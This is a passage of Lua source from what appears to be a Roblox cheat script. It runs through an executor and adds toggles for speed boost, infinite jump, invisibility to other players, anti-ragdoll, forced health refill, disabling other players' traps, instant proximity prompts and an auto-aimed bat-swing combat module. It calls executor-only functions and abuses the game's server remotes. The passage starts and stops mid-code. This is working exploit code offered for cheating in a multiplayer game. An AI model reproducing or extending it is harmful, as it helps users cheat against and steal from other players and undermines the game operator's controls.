		end)

		v14:CreateSlider({
			Name = "Boost Speed",
			Min = 20,
			Max = 1000,
			Default = 350,
			Increment = 5,
			Unit = "studs/s",
			Callback = function(arg)
				n9 = math.clamp(tonumber(arg) or 350, 20, 1000)
			end,
		})

		fn4(fn22)
		local v15 = nil
		local connection3 = nil

		local function fn25()
			if connection3 then
				connection3:Disconnect()
				connection3 = nil
			end

			tbl4.Shield("jump", false)
		end

		v15 = v14:CreateToggle({
			Name = "Infinite Jump",
			Default = false,
			Callback = function()
				if not tbl4.Toggle(v15, false) then
					fn25()
					return
				end

				if connection3 then
					return
				end
				tbl4.Shield("jump", true)

				connection3 = UserInputService.JumpRequest:Connect(function()
					local character = localPlayer.Character
					local humanoid = character and character:FindFirstChildOfClass("Humanoid")

					if humanoid then
						pcall(function()
							humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
						end)
					end
				end)
			end,
		})

		fn4(fn25)
	end

	do
		local v13 = nil
		local flag3 = false
		local flag4 = true
		local flag5 = false
		local flag6 = false
		local flag7 = false
		local v14 = nil
		local v15 = nil
		local hipHeight = 999

		local function fn20()
			return flag3 and not tbl4.InvisSuspended
		end

		local function fn21(arg)
			return arg and arg:FindFirstChildOfClass("Humanoid") or nil
		end

		local function fn22(arg)
			return networking:FindFirstChild(arg)
		end

		local function fn23(arg)
			return arg ~= nil and arg:GetAttribute("InvisApplied") == true
		end

		local function fn24()
			local AskDoff = fn22("RF/Treadmill/AskDoff")

			if AskDoff and AskDoff:IsA("RemoteFunction") then
				for i = 1, 2 do
					pcall(AskDoff.InvokeServer, AskDoff)
				end
			end
		end

		local function fn25(arg)
			local AskRigWipe = fn22("RE/RigSync/AskRigWipe")

			if AskRigWipe and AskRigWipe:IsA("RemoteEvent") then
				pcall(AskRigWipe.FireServer, AskRigWipe, arg)
			end
		end

		local function fn26(arg)
			local backpack = localPlayer:FindFirstChildOfClass("Backpack")

			for _, child in ipairs(arg:GetChildren()) do
				if child:IsA("Humanoid") then
					pcall(child.UnequipTools, child)
				end
			end

			if backpack then
				for _, child in ipairs(arg:GetChildren()) do
					if child:IsA("Tool") then
						pcall(function()
							child.Parent = backpack
						end)
					end
				end
			end

			for i = 1, 3 do
				RunService.Heartbeat:Wait()
			end
		end

		local function fn27(arg)
			local v16 = fn21(arg)
			if not arg or not v16 then
				return false
			end
			fn26(arg)
			fn24()

			pcall(function()
				v16:SetStateEnabled(Enum.HumanoidStateType.Dead, true)
				v16.BreakJointsOnDeath = true
				v16.RequiresNeck = true
				v16.Health = 0
			end)

			pcall(function()
				v16:ChangeState(Enum.HumanoidStateType.Dead)
			end)

			pcall(function()
				arg:BreakJoints()
			end)

			fn25(arg)
			return true
		end

		local function fn28(parent)
			local v16 = fn21(parent)
			local n9 = os.clock() + 10

			while true do
				if os.clock() < n9 and flag4 and parent.Parent then
					v16 = v16 or fn21(parent)
					if not (v16 and parent:FindFirstChild("HumanoidRootPart") and parent:FindFirstChild("Head")) then
						task.wait()
						continue
					end
				end

				break
			end

			local humanoidRootPart = parent:FindFirstChild("HumanoidRootPart")
			if not fn20() or not v16 or not humanoidRootPart or not parent:FindFirstChild("Head") then
				return false
			end
			task.wait(0.05)
			if not fn20() or parent.Parent == nil then
				return false
			end

			for i = 1, 2 do
				pcall(v16.UnequipTools, v16)
			end

			if type(replicatesignal) == "function" then
				for i = 1, 2 do
					pcall(replicatesignal, v16.ServerBreakJoints)
				end
			end

			local hipHeight2 = v16.HipHeight

			pcall(function()
				v16.HipHeight = hipHeight
			end)

			for _, child in ipairs(parent:GetChildren()) do
				if child:IsA("Accessory") or child:IsA("BasePart") and child ~= humanoidRootPart then
					pcall(function()
						child.Parent = nil
					end)
				end
			end

			task.wait(0.12)

			local function fn29()
				pcall(function()
					v16.HipHeight = hipHeight2
				end)

				for _, child in ipairs(parent:GetChildren()) do
					if child:IsA("Humanoid") and child.HipHeight ~= hipHeight2 then
						pcall(function()
							child.HipHeight = hipHeight2
						end)
					end
				end
			end

			if parent.Parent == nil then
				fn29()
				return false
			end
			local motor6D = Instance.new("Motor6D")
			motor6D.Name = "RightWrist"
			motor6D.C0 = CFrame.new(1.2, 0, 0)
			motor6D.C1 = CFrame.new()
			motor6D.Part0 = humanoidRootPart
			motor6D.Parent = humanoidRootPart
			local part = Instance.new("Part")
			part.Name = "RightHand"
			part.Size = Vector3.new(0.2, 0.2, 0.2)
			part.Transparency = 1
			part.CanCollide = false
			part.CanTouch = false
			part.CanQuery = false
			part.Massless = true
			part.CFrame = humanoidRootPart.CFrame * motor6D.C0
			motor6D.Part1 = part
			part.Parent = parent

			pcall(function()
				humanoidRootPart.CanCollide = false
			end)

			fn29()
			parent:SetAttribute("InvisApplied", true)

			task.delay(1, function()
				local chilliToolKeeper = (typeof(getgenv) == "function" and getgenv() or _G).ChilliToolKeeper

				if parent.Parent and type(chilliToolKeeper) == "function" then
					pcall(chilliToolKeeper)
				end
			end)

			task.delay(0.2, function()
				if humanoidRootPart.Parent then
					pcall(function()
						humanoidRootPart.CanCollide = true
					end)
				end
			end)

			local connection = parent.ChildAdded:Connect(function(child)
				if child:IsA("Humanoid") then
					task.defer(function()
						if child.HipHeight ~= hipHeight2 then
							pcall(function()
								child.HipHeight = hipHeight2
							end)
						end
					end)
				end
			end)

			local connection2 = nil

			connection2 = parent.AncestryChanged:Connect(function(child, parent2)
				if parent2 == nil then
					connection:Disconnect()
					connection2:Disconnect()
				end
			end)

			return true
		end

		local function fn29()
			local active = tbl4.Steal.Active or tbl4.Steal.Carrying or tbl4.Flying

			if not active then
				active = (tbl4.Driving or 0) > 0
			end

			return active
		end

		tbl4.RequestRespawn = function()
			flag7 = true
		end

		local function fn30()
			flag5 = true
			local v16 = flag7

			while flag4 and (fn29() or not tbl4.ClaimMovement("invisibility")) do
				task.wait(0.2)
			end

			local character = localPlayer.Character

			if flag4 and character and (v16 or fn23(character) ~= fn20()) and fn21(character) then
				flag7 = false
				tbl6.Paused = true
				tbl4.ShieldPaused = true
				pcall(tbl4.UndoSwap)
				task.wait()
				fn27(localPlayer.Character)
				local n9 = os.clock() + 60
				local n10 = os.clock() + 8

				while flag4 and os.clock() < n9 and localPlayer.Character == character do
					if n10 <= os.clock() then
						n10 = os.clock() + 8
						fn25(character)
					end

					task.wait(0.05)
				end

				task.wait(0.1)

				while flag4 and flag6 do
					task.wait(0.05)
				end
			end

			tbl6.Paused = false
			tbl4.ShieldPaused = false
			tbl4.ReleaseMovement("invisibility")
			flag5 = false
		end

		local connection = localPlayer.CharacterAdded:Connect(function(character)
			if not fn20() then
				return
			end
			flag6 = true
			tbl4.ShieldPaused = true

			task.spawn(function()
				pcall(fn28, character)
				flag6 = false

				if not flag5 then
					tbl4.ShieldPaused = false
				end
			end)
		end)

		local thread = task.spawn(function()
			while flag4 do
				local character = localPlayer.Character
				local v16 = fn21(character)
				local flag8 = not flag5 and not flag6 and character and v16 and v16.Health > 0
				local flag9

				if flag8 then
					local v17 = flag7

					if flag7 then
						flag9 = v17
					else
						flag9 = fn23(character) ~= fn20()
					end
				else
					flag9 = flag8
				end

				if flag9 then
					fn30()
				end

				local v17 = fn23(localPlayer.Character)

				if v17 ~= v14 then
					v14 = v17
					tbl4.SetSpeedForced(v17)
				end

				task.wait(0.25)
			end
		end)

		local connection2 = RunService.Heartbeat:Connect(function()
			local character = localPlayer.Character
			if not character or not fn23(character) then
				return
			end
			local rightHand = character:FindFirstChild("RightHand")
			local tool = character:FindFirstChildWhichIsA("Tool")
			local handle = tool and tool:FindFirstChild("Handle")
			if not rightHand or not handle or not handle:IsA("BasePart") then
				return
			end
			local cframe = CFrame.new()

			for _, child in ipairs(rightHand:GetChildren()) do
				if child:IsA("JointInstance") and child.Name == "RightGrip" and child.Part1 == handle then
					cframe = child.C0 * child.C1:Inverse()

					if child.Enabled then
						child.Enabled = false
					end
				end
			end

			pcall(function()
				handle.CFrame = rightHand.CFrame * cframe
				handle.AssemblyLinearVelocity = Vector3.zero
				handle.AssemblyAngularVelocity = Vector3.zero
			end)
		end)

		fn4(function()
			connection2:Disconnect()
		end)

		local connection3 = RunService.Heartbeat:Connect(function()
			local character = localPlayer.Character
			local v16 = fn21(character)
			local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
			if not v16 or not humanoidRootPart or v16.Health <= 0 then
				return
			end
			local flag8 = fn23(character) and not tbl4.Steal.Active and not tbl4.Flying

			if flag8 then
				flag8 = (tbl4.Driving or 0) == 0
			end

			if flag8 then
				flag8 = not (tbl4.Treadmill and tbl4.Treadmill.Riding)
			end

			if not (flag8 and not v16.Sit and not v16.PlatformStand) then
				if v15 == v16 then
					v15 = nil

					pcall(function()
						v16.AutoRotate = true
					end)
				end

				return
			end

			if v16.AutoRotate then
				pcall(function()
					v16.AutoRotate = false
				end)
			end

			v15 = v16
			local moveDirection = v16.MoveDirection
			local vector = Vector3.new(moveDirection.X, 0, moveDirection.Z)

			if vector.Magnitude > 0.01 then
				pcall(function()
					humanoidRootPart.CFrame = CFrame.lookAt(humanoidRootPart.Position, humanoidRootPart.Position + vector.Unit)
				end)
			end
		end)

		tbl4.InvisibilityHandle = v11:CreateToggle({
			Name = "Invisibility",
			Note = "Makes you invisible to other players",
			Default = false,
			Callback = function()
				local str2

				if type(tbl4.CombatActive) == "function" and tbl4.CombatActive() then
					str2 = "Auto Hit"
				end

				if tbl4.Toggle(v13, false) and str2 then
					flag3 = false
					local v16 = v13

					tbl4.UiDefer(function()
						pcall(v16.Set, v16, false, false)
						tbl4.Notify("Invisibility", "Turn off " .. str2 .. " first, both cannot be on at the same time")
					end)

					return
				end

				flag3 = tbl4.Toggle(v13, false) == true

				if fn20() and not fn23(localPlayer.Character) and tbl4.Movement.Owner == nil then
					tbl4.Movement.Owner = "invisibility"
				end
			end,
		})

		fn4(function()
			flag4 = false
			connection:Disconnect()
			connection3:Disconnect()
			pcall(task.cancel, thread)
			tbl6.Paused = false
			tbl4.ShieldPaused = false
			tbl4.ReleaseMovement("invisibility")
		end)
	end

	local tbl15
	tbl15 = { BallSocketConstraint = true, NoCollisionConstraint = true, HingeConstraint = true }
	local tbl16

	tbl16 = {
		[Enum.HumanoidStateType.Physics] = true,
		[Enum.HumanoidStateType.Ragdoll] = true,
		[Enum.HumanoidStateType.FallingDown] = true,
	}

	local v13

	do
		local n9 = 0.5
		local n10 = 5
		local n11 = 0

		v13 = fn2(function()
			return ReplicatedStorage.Shared.Modules.Ragdoll
		end)

		local v14 = nil

		local function fn20()
			if v14 then
				return v14
			end

			local ok, result = pcall(function()
				return require(localPlayer:WaitForChild("PlayerScripts", 5):WaitForChild("PlayerModule", 5)):GetControls()
			end)

			if ok then
				v14 = result
			end

			return v14
		end

		local v15 = nil
		local flag3 = false
		local connection = nil
		local n12 = 0
		local fn21 = nil
		local tbl17 = {}
		local tbl18 = {}
		local n13 = 0
		local v16 = nil
		local humanoid = nil

		local function fn22(arg)
			for _, v17 in ipairs(arg) do
				if v17.Connected then
					v17:Disconnect()
				end
			end

			table.clear(arg)
		end

		local function fn23(arg)
			tbl17[#tbl17 + 1] = arg
		end

		local function fn24(arg)
			tbl18[#tbl18 + 1] = arg
		end

		local function fn25()
			if not v16 or not humanoid then
				return
			end
			local humanoidRootPart = v16:FindFirstChild("HumanoidRootPart")
			if not humanoidRootPart then
				return
			end
			local assemblyLinearVelocity = humanoidRootPart.AssemblyLinearVelocity
			local vector = Vector3.new(assemblyLinearVelocity.X, 0, assemblyLinearVelocity.Z)
			local n14 = humanoid.WalkSpeed + n10
			local y = assemblyLinearVelocity.Y
			local flag4 = false

			if n14 < vector.Magnitude then
				vector = vector.Unit * n14
				flag4 = true
			end

			if n11 < y then
				y = n11
				flag4 = true
			end

			if flag4 then
				pcall(function()
					humanoidRootPart.AssemblyLinearVelocity = Vector3.new(vector.X, y, vector.Z)
				end)
			end
		end

		local function fn26()
			if type(v13) ~= "table" then
				return
			end

			if type(v13.ClearClientRagdoll) == "function" then
				pcall(v13.ClearClientRagdoll)
			end

			if type(v13.Unragdoll) == "function" then
				pcall(v13.Unragdoll, v16)
			end
		end

		local function fn27()
			if not v16 or not v16.Parent then
				return
			end

			for _, descendant in ipairs(v16:GetDescendants()) do
				if tbl15[descendant.ClassName] then
					pcall(function()
						descendant:Destroy()
					end)
				end
			end
		end

		local function fn28()
			if not v16 or not v16.Parent then
				return
			end

			for _, descendant in ipairs(v16:GetDescendants()) do
				if descendant:IsA("Motor6D") and not descendant.Enabled then
					pcall(function()
						descendant.Enabled = true
					end)
				elseif descendant:IsA("AnimationConstraint") and not descendant.Enabled then
					pcall(function()
						descendant.Enabled = true
					end)
				end
			end
		end

		local function fn29()
			local v17 = fn20()

			if v17 and v17.controlsEnabled == false then
				pcall(function()
					v17:Enable()
				end)
			end
		end

		local function fn30()
			local currentCamera = workspace.CurrentCamera

			if currentCamera and humanoid and currentCamera.CameraSubject ~= humanoid then
				pcall(function()
					currentCamera.CameraSubject = humanoid
				end)
			end
		end

		local function fn31()
			if not humanoid or not humanoid.Parent or humanoid.Health <= 0 then
				return
			end

			if tbl16[humanoid:GetState()] then
				pcall(function()
					humanoid:ChangeState(Enum.HumanoidStateType.Running)
				end)
			end

			if humanoid.PlatformStand then
				humanoid.PlatformStand = false
			end
		end

		local function fn32()
			if type(v13) == "table" and type(v13.IsRagdolled) == "function" then
				local ok, result = pcall(v13.IsRagdolled, v16)
				if ok and result == true then
					return true
				end
			end

			local num = tonumber(localPlayer:GetAttribute("RagdollEndTime"))
			return num ~= nil and num > workspace:GetServerTimeNow()
		end

		local n14 = 21

		local function fn33()
			if tbl4.AntiGuard.Busy == true then
				return true
			end

			if (tonumber(tbl4.AntiGuard.HitArms) or 0) <= 0 then
				return false
			end
			return os.clock() - (tonumber(tbl4.AntiGuard.HitArmedAt) or 0) <= n14
		end

		local function fn34()
			if not humanoid or not humanoid.Parent then
				return false
			end

			if humanoid.PlatformStand then
				return true
			end
			return tbl16[humanoid:GetState()] == true
		end

		local function fn35()
			if not v16 or not v16.Parent then
				return false
			end

			for _, child in ipairs(v16:GetChildren()) do
				if tbl15[child.ClassName] then
					return true
				end

				if child:IsA("BasePart") then
					for _, child2 in ipairs(child:GetChildren()) do
						if tbl15[child2.ClassName] then
							return true
						end
					end
				end
			end

			return false
		end

		local function fn36()
			fn25()
			fn26()
			fn27()
			fn28()
			fn31()
			fn29()
			fn30()
		end

		local function fn37()
			if not flag3 or fn33() then
				return
			end
			n12 = os.clock() + n9
		end

		local function fn38()
			local character = localPlayer.Character

			if character ~= v16 then
				if character then
					fn21(character)
				else
					n13 += 1
					fn22(tbl18)
					v16 = nil
					humanoid = nil
				end

				return
			end

			if not v16 then
				return
			end

			if v16:FindFirstChildOfClass("Humanoid") ~= humanoid then
				fn21(v16)
			end
		end

		local function fn39()
			if not flag3 then
				return
			end
			fn38()
			if not v16 or not humanoid or humanoid.Health <= 0 then
				return
			end

			if fn33() then
				n12 = 0
				return
			end
			local now = os.clock()

			if fn34() or fn32() or fn35() then
				n12 = now + n9
			end

			if now <= n12 then
				fn36()
			end
		end

		fn21 = function(arg)
			n13 += 1
			local v17 = n13
			fn22(tbl18)
			v16 = arg
			humanoid = nil
			if not flag3 or not arg then
				return
			end
			humanoid = arg:FindFirstChildOfClass("Humanoid")
			if not flag3 or n13 ~= v17 or arg ~= localPlayer.Character or not humanoid or not humanoid:IsA("Humanoid") then
				return
			end

			fn24(humanoid.StateChanged:Connect(function(old, new)
				if flag3 and tbl16[new] then
					fn37()
				end
			end))

			fn24(humanoid:GetPropertyChangedSignal("PlatformStand"):Connect(function()
				if flag3 and humanoid and humanoid.PlatformStand then
					fn37()
				end
			end))

			fn24(arg.DescendantAdded:Connect(function(descendant)
				if flag3 and tbl15[descendant.ClassName] then
					fn37()
				end
			end))

			fn24(arg.ChildAdded:Connect(function(child)
				if flag3 and child:IsA("Humanoid") and child ~= humanoid then
					task.defer(fn38)
				end
			end))

			fn30()

			if fn32() then
				fn37()
			end
		end

		local function fn40()
			flag3 = false
			n13 += 1
			n12 = 0

			if connection then
				pcall(function()
					connection:Disconnect()
				end)

				connection = nil
			end

			fn22(tbl18)
			fn22(tbl17)
			v16 = nil
			humanoid = nil
		end

		local function fn41()
			fn40()
			flag3 = true
			fn20()
			connection = RunService.Heartbeat:Connect(fn39)

			fn23(localPlayer.CharacterAdded:Connect(function(character)
				if flag3 then
					task.defer(function()
						if flag3 and character == localPlayer.Character then
							fn21(character)
						end
					end)
				end
			end))

			fn23(localPlayer.CharacterRemoving:Connect(function(character)
				if flag3 and character == v16 then
					n13 += 1
					n12 = 0
					fn22(tbl18)
					v16 = nil
					humanoid = nil
				end
			end))

			fn23(localPlayer:GetAttributeChangedSignal("RagdollEndTime"):Connect(function()
				if flag3 then
					fn37()
				end
			end))

			local clientRagdollRemote = type(v13) == "table" and v13.ClientRagdollRemote or nil

			if typeof(clientRagdollRemote) == "Instance" and clientRagdollRemote:IsA("RemoteEvent") then
				fn23(clientRagdollRemote.OnClientEvent:Connect(function()
					if flag3 and not fn33() then
						fn25()
						fn37()
					end
				end))
			end

			fn23(tbl4.OnHumanoidChanged(function()
				if flag3 and localPlayer.Character then
					fn21(localPlayer.Character)
				end
			end))

			if localPlayer.Character then
				fn21(localPlayer.Character)
			end
		end

		fn4(fn40)

		v15 = v11:CreateToggle({
			Name = "Anti Ragdoll",
			Default = true,
			Callback = function()
				if tbl4.Toggle(v15, false) then
					fn41()
				else
					fn40()
				end
			end,
		})
	end

	do
		local flag3 = false
		local tbl17 = {}

		local function fn20()
			for _, v14 in ipairs(tbl17) do
				pcall(function()
					v14:Disconnect()
				end)
			end

			table.clear(tbl17)
		end

		local function fn21(arg)
			if flag3 and arg.Parent and arg.Health > 0 and arg.Health < arg.MaxHealth then
				pcall(function()
					arg.Health = arg.MaxHealth
				end)
			end
		end

		local function fn22(arg)
			fn20()
			if not flag3 or not arg then
				return
			end
			local humanoid = arg:FindFirstChildOfClass("Humanoid") or arg:WaitForChild("Humanoid", 5)
			if not flag3 or not humanoid or not humanoid:IsA("Humanoid") or arg ~= localPlayer.Character then
				return
			end

			table.insert(tbl17, humanoid.HealthChanged:Connect(function()
				fn21(humanoid)
			end))

			table.insert(tbl17, RunService.Heartbeat:Connect(function()
				fn21(humanoid)
			end))

			fn21(humanoid)
		end

		local connection = localPlayer.CharacterAdded:Connect(function(character)
			if flag3 then
				task.defer(fn22, character)
			end
		end)

		local v14 = tbl4.OnHumanoidChanged(function()
			if flag3 and localPlayer.Character then
				fn22(localPlayer.Character)
			end
		end)

		fn4(function()
			flag3 = false
			connection:Disconnect()
			v14:Disconnect()
			fn20()
		end)

		flag3 = true

		if localPlayer.Character then
			task.spawn(fn22, localPlayer.Character)
		end
	end

	do
		local v14 = nil
		local flag3 = true
		local tbl17 = {}
		local tbl18 = {}

		local function fn20(arg)
			if arg:IsA("BasePart") and tbl17[arg] == nil then
				tbl17[arg] = arg.CanTouch

				pcall(function()
					arg.CanTouch = false
				end)
			end
		end

		local function fn21(arg)
			if not flag3 or not arg.Parent then
				return
			end
			local name = localPlayer.Name
			if arg:GetAttribute("Owner") == name then
				return
			end
			fn20(arg)

			for _, descendant in ipairs(arg:GetDescendants()) do
				fn20(descendant)
			end

			table.insert(tbl18, arg.DescendantAdded:Connect(function(descendant)
				if flag3 then
					fn20(descendant)
				end
			end))
		end

		local function fn22()
			for _, v15 in ipairs(CollectionService:GetTagged("PlacedTrap")) do
				fn21(v15)
			end
		end

		local function fn23()
			for k, v15 in pairs(tbl17) do
				if k.Parent then
					pcall(function()
						k.CanTouch = v15
					end)
				end
			end

			table.clear(tbl17)
		end

		table.insert(tbl18, CollectionService:GetInstanceAddedSignal("PlacedTrap"):Connect(function(arg)
			task.defer(fn21, arg)
		end))

		v14 = v11:CreateToggle({
			Name = "Anti Trap",
			Note = "Traps from other players cannot catch you",
			Default = true,
			Callback = function()
				flag3 = tbl4.Toggle(v14, true) == true

				if flag3 then
					fn22()
				else
					fn23()
				end
			end,
		})

		fn22()

		fn4(function()
			flag3 = false

			for _, v15 in ipairs(tbl18) do
				pcall(function()
					v15:Disconnect()
				end)
			end

			table.clear(tbl18)
			fn23()
		end)
	end

	do
		local v14 = nil
		local str2 = "CarryAreaEgg"
		local tbl17 = { ClaimLostPart = true }
		local tbl18 = {}
		local connection = nil
		local connection2 = nil

		local function fn20(arg)
			if not arg:IsA("ProximityPrompt") or tbl17[arg.Name] then
				return
			end

			if tbl18[arg] == nil then
				if arg.HoldDuration <= 0 and arg.Name ~= str2 then
					return
				end
				tbl18[arg] = arg.HoldDuration
			end

			if arg.HoldDuration ~= 0 then
				pcall(function()
					arg.HoldDuration = 0
				end)
			end
		end

		local function fn21(arg)
			if arg.Name ~= "SmartPromptPart" then
				return nil
			end
			local carryAreaEgg = arg:FindFirstChild("CarryAreaEgg")
			return carryAreaEgg and carryAreaEgg:IsA("ProximityPrompt") and carryAreaEgg or nil
		end

		tbl4.PromptHold = function(arg)
			local v15 = tbl18[arg]
			if type(v15) == "number" then
				return v15
			end
			return arg.HoldDuration
		end

		local function fn22()
			if connection then
				return
			end

			connection2 = ProximityPromptService.PromptShown:Connect(function(arg)
				if tbl4.Toggle(v14, true) then
					fn20(arg)
				end
			end)

			for _, child in ipairs(workspace:GetChildren()) do
				local v15 = fn21(child)

				if v15 then
					fn20(v15)
				end
			end

			connection = workspace.ChildAdded:Connect(function(child)
				if child.Name ~= "SmartPromptPart" then
					return
				end

				task.defer(function()
					local carryAreaEgg = child:FindFirstChild("CarryAreaEgg") or child:WaitForChild("CarryAreaEgg", 2)

					if carryAreaEgg and carryAreaEgg:IsA("ProximityPrompt") and tbl4.Toggle(v14, true) then
						fn20(carryAreaEgg)
					end
				end)
			end)
		end

		local function fn23()
			for k, v15 in pairs(tbl18) do
				if k and k.Parent then
					pcall(function()
						k.HoldDuration = v15
					end)
				end
			end

			table.clear(tbl18)

			if connection then
				connection:Disconnect()
				connection = nil
			end

			if connection2 then
				connection2:Disconnect()
				connection2 = nil
			end
		end

		tbl4.PressStealPrompt = function(arg)
			if typeof(fireproximityprompt) ~= "function" or not arg then
				return false
			end
			local v15 = nil
			local huge = math.huge

			for _, child in ipairs(workspace:GetChildren()) do
				local v16 = fn21(child)

				if v16 and child:IsA("BasePart") then
					local magnitude = (child.Position - arg).Magnitude

					if magnitude < huge then
						v15 = v16
						huge = magnitude
					end
				end
			end

			if not v15 or huge > 14 then
				return false
			end

			if tbl4.Toggle(v14, true) then
				pcall(function()
					v15.HoldDuration = 0
				end)
			end

			local ok = pcall(fireproximityprompt, v15)

			if ok and v15.HoldDuration > 0 then
				task.wait(v15.HoldDuration + 0.1)
			end

			return ok
		end

		tbl3.Add(function()
			if tbl4.Toggle(v14, true) then
				fn22()

				for k in pairs(tbl18) do
					if not k.Parent then
						tbl18[k] = nil
					elseif k.HoldDuration ~= 0 then
						pcall(function()
							k.HoldDuration = 0
						end)
					end
				end
			elseif next(tbl18) ~= nil or connection then
				fn23()
			end

			return false
		end)

		v14 = v11:CreateToggle({
			Name = "Instant Prompts",
			Default = true,
			Callback = function()
				tbl3.Wake()
			end,
		})

		fn4(fn23)
	end

	tbl4.Combat = {}
	local combat
	combat = tbl4.Combat
	local n9, n10, n11, n12, n13, n14, n15, n16, n17, tbl17

	do
		local n18 = 15
		local n19 = 2
		n9 = 0.05
		n10 = 1
		n11 = 0.18
		n12 = -0.275
		n13 = 0.6
		n14 = 6
		n15 = 1.1
		n16 = 0.8
		n17 = 2.5
		local n20 = 35
		local n21 = 0.12
		local n22 = 6
		local n23 = 6
		local n24 = 3
		local tbl18 = { 0.12, 0.2, 0.28, 0.36, 0.46, 0.6 }
		local tbl19 = { ["WALL LEFT"] = true, ["WALL RIGHT"] = true }

		tbl17 = {
			Trigger = nil,
			LastFire = 0,
			Trace = 0,
			EquipAt = 0,
			Walls = {},
			WallsAt = 0,
			WallSide = setmetatable({}, { __mode = "k" }),
			Tracks = setmetatable({}, { __mode = "k" }),
			Stats = {},
			Option = 3,
			Pending = {},
			Holders = {},
			SpawnRagdoll = nil,
		}

		for i = 1, #tbl18 do
			tbl17.Stats[i] = { Hits = 0, Shots = 0 }
		end

		local raycastParams = RaycastParams.new()
		raycastParams.FilterType = Enum.RaycastFilterType.Exclude

		pcall(function()
			raycastParams.RespectCanCollide = true
		end)

		local function fn20()
			return workspace:GetServerTimeNow()
		end

		local function fn21()
			local trigger = tbl17.Trigger
			if trigger and trigger.Parent then
				return trigger
			end
			local reBatSwingTrigger = networking:FindFirstChild("RE/BatSwing/Trigger")
			tbl17.Trigger = reBatSwingTrigger
			return reBatSwingTrigger
		end

		local function fn22(arg)
			return tonumber(arg:GetAttribute("RagdollEndTime")) or 0
		end

		combat.SetLead = function(arg)
			n12 = math.clamp((tonumber(arg) or -275) / 1000, -0.4, 0.1)
		end

		combat.SetSweep = function(arg)
			n13 = math.clamp((tonumber(arg) or 60) / 100, 0, 2.5)
		end

		combat.Ragdolled = function(arg)
			return fn22(arg) > fn20()
		end

		combat.SelfRagdolled = function()
			local v14 = fn22(localPlayer)
			if v14 <= fn20() then
				return false
			end
			return v14 ~= tbl17.SpawnRagdoll
		end

		combat.Humanoid = function(arg)
			if not arg then
				return nil
			end
			local v14 = nil

			for _, child in ipairs(arg:GetChildren()) do
				if child:IsA("Humanoid") then
					if child.Health > 0 then
						return child
					end
					v14 = v14 or child
				end
			end

			return v14
		end

		local function fn23(arg)
			local gears = tbl.Gears
			local directory = type(gears) == "table" and gears.Directory or nil
			local flag3 = type(directory) == "table"
			local v14

			if flag3 then
				v14 = directory[tostring(arg:GetAttribute("GearName") or arg.Name)]
			else
				v14 = flag3
			end

			v14 = v14 or nil
			local batControllerData = type(v14) == "table" and v14.BatControllerData or nil
			return type(batControllerData) == "table" and tonumber(batControllerData.RangeBonus) or 0
		end

		combat.Range = function(arg)
			local n25 = workspace:GetAttribute("DragonEggEventActive") == true and 2.5 or 1
			return (n18 + n19 + (arg and fn23(arg) or 0)) * n25
		end

		combat.PickBat = function(arg)
			local tool = arg:FindFirstChildWhichIsA("Tool")
			if tool and tbl4.IsBatTool(tool) then
				return tool
			end
			local v14, v15, v16 = ipairs({ arg, localPlayer:FindFirstChildOfClass("Backpack") })
			local n25 = -1
			local v17 = nil

			for _, v18 in v14, v15, v16 do
				if v18 then
					for _, child in ipairs(v18:GetChildren()) do
						if tbl4.IsBatTool(child) then
							local v19 = fn23(child)

							if v19 > n25 then
								n25 = v19
								v17 = child
							end
						end
					end
				end
			end

			return v17
		end

		local function fn24(parent, arg, arg2)
			if arg2.Parent == parent then
				return true
			end
			local equipAt = tbl17.EquipAt
			if os.clock() - equipAt < 0.2 then
				return false
			end
			tbl17.EquipAt = os.clock()

			pcall(function()
				arg:EquipTool(arg2)
			end)

			if arg2.Parent ~= parent then
				pcall(function()
					arg2.Parent = parent
				end)
			end

			return arg2.Parent == parent
		end

		combat.Parts = function(arg)
			arg = arg and arg.Character
			local humanoidRootPart = arg and arg:FindFirstChild("HumanoidRootPart")
			local humanoid = arg and arg:FindFirstChildOfClass("Humanoid")
			if not humanoidRootPart or not humanoid or humanoid.Health <= 0 then
				return nil, nil
			end
			return arg, humanoidRootPart
		end

		combat.Hittable = function(arg)
			if not arg or arg == localPlayer or arg.Parent ~= Players then
				return false
			end
			local v14, v15 = combat.Parts(arg)
			if not v14 then
				return false
			end

			if v14:GetAttribute("IsTrapped") == true or arg:GetAttribute("InBossArena") then
				return false
			end
			return not tbl4.InsideBase(v15.Position)
		end

		local function fn25()
			local wallsAt = tbl17.WallsAt
			if os.clock() < wallsAt then
				return tbl17.Walls
			end
			tbl17.WallsAt = os.clock() + 5
			local walls = {}
			local world = workspace:FindFirstChild("World") or workspace:FindFirstChild("__OBJECTS")
			world = world and world:FindFirstChild("Build")

			if world then
				for _, child in ipairs(world:GetChildren()) do
					local collisions = child:FindFirstChild("COLLISIONS")
					collisions = collisions and collisions:FindFirstChild("GUARD NO COLLIDE")

					if collisions then
						for _, child2 in ipairs(collisions:GetChildren()) do
							if tbl19[child2.Name] then
								if child2:IsA("BasePart") then
									table.insert(walls, child2)
								end

								for _, descendant in ipairs(child2:GetDescendants()) do
									if descendant:IsA("BasePart") then
										table.insert(walls, descendant)
									end
								end
							end
						end
					end
				end
			end

			tbl17.Walls = walls
			return walls
		end

		local function fn26(arg)
			if arg.X <= arg.Y and arg.X <= arg.Z then
				return "X", "Y", "Z"
			end

			if arg.Y <= arg.Z then
				return "Y", "X", "Z"
			end
			return "Z", "X", "Y"
		end

		local function fn27(arg)
			local n25 = math.abs(arg.RightVector.Y)
			local n26 = math.abs(arg.UpVector.Y)
			local n27 = math.abs(arg.LookVector.Y)
			if n25 >= n26 and n25 >= n27 then
				return "X"
			end

			if n26 >= n27 then
				return "Y"
			end
			return "Z"
		end

		local function fn28(arg, arg2, arg3, arg4)
			if arg3 == arg4 then
				return true
			end
			local n25 = arg2[arg3] + n22
			return math.abs(arg[arg3]) <= n25
		end

		local function fn29(arg, arg2)
			for _, v14 in ipairs(fn25()) do
				if v14.Parent then
					local cFrame = v14.CFrame
					local size = v14.Size
					local v15, v16, v17 = fn26(size)
					local v18 = fn27(cFrame)
					local n25 = size / 2
					local v19 = cFrame:PointToObjectSpace(arg2)

					if fn28(v19, n25, v16, v18) and fn28(v19, n25, v17, v18) then
						local v20 = cFrame:PointToObjectSpace(arg)
						local n26 = math.abs(v20[v15])
						local n27 = tbl17.WallSide[v14]

						if n26 >= n25[v15] + n22 * 0.5 or n27 == nil and n26 >= n25[v15] then
							n27 = v20[v15] >= 0 and 1 or -1
							tbl17.WallSide[v14] = n27
						elseif n27 == nil then
